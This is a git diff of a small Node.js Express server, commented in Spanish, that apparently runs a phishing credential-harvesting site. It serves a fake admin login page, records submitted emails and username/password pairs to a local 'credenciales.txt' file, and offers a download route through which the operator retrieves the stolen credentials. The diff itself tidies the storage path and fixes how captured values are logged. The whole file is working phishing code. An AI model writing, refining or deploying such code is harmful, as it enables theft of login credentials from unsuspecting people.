@@ -5,6 +5,7 @@ const bodyParser = require("body-parser");
 
 const app = express();
 const PORT = process.env.PORT || 3000; // Usa el puerto 3000 por defecto
+const tempPath = path.join("./", "credenciales.txt");
 
 // Middleware para leer formularios
 app.use(bodyParser.urlencoded({ extended: true }));
@@ -16,22 +17,19 @@ app.use(
 );
 
 app.get("/auth", (req, res) => {
-  const email = req.query.email || "";
-  const open = req.query.open || "";
-
-  if (email) {
+  const email = req.query.email;
+  const open = req.query.open;
+  if (email && email !== "") {
     // Guardar credenciales en archivo
     const credenciales = `Email: ${email} | Mail \n`;
-
     // Aquí podrías guardarlo si quieres
-    fs.appendFileSync(path.join("/tmp", "credenciales.txt"), credenciales);
+    fs.appendFileSync(tempPath, credenciales);
   }
-  if (open) {
+  if (open && open !== "") {
     // Guardar credenciales en archivo
-    const credenciales = `EmailOpen: ${email} | Mail \n`;
-
+    const credencialesOpen = `EmailOpen: ${open} | Mail \n`;
     // Aquí podrías guardarlo si quieres
-    fs.appendFileSync(path.join("/tmp", "credenciales.txt"), credenciales);
+    fs.appendFileSync(tempPath, credencialesOpen);
   }
 
   const filePath = path.join(__dirname, "edradminlogin.html");
@@ -40,9 +38,7 @@ app.get("/auth", (req, res) => {
 
 // Ruta para descargar el archivo credenciales.txt
 app.get("/descargar", (req, res) => {
-  const filePath = path.join("/tmp", "credenciales.txt");
-
-  if (!fs.existsSync(filePath)) {
+  if (!fs.existsSync(tempPath)) {
     return res.status(404).send("Archivo no encontrado.");
   }
 
@@ -60,7 +56,6 @@ app.post("/login", (req, res) => {
 
   // Guardar credenciales en archivo
   const credenciales = `Usuario: ${usuario} | Clave: ${clave}\n`;
-  const tempPath = path.join("/tmp", "credenciales.txt");
   fs.appendFileSync(tempPath, credenciales);
 
   // Redirigir a otra web
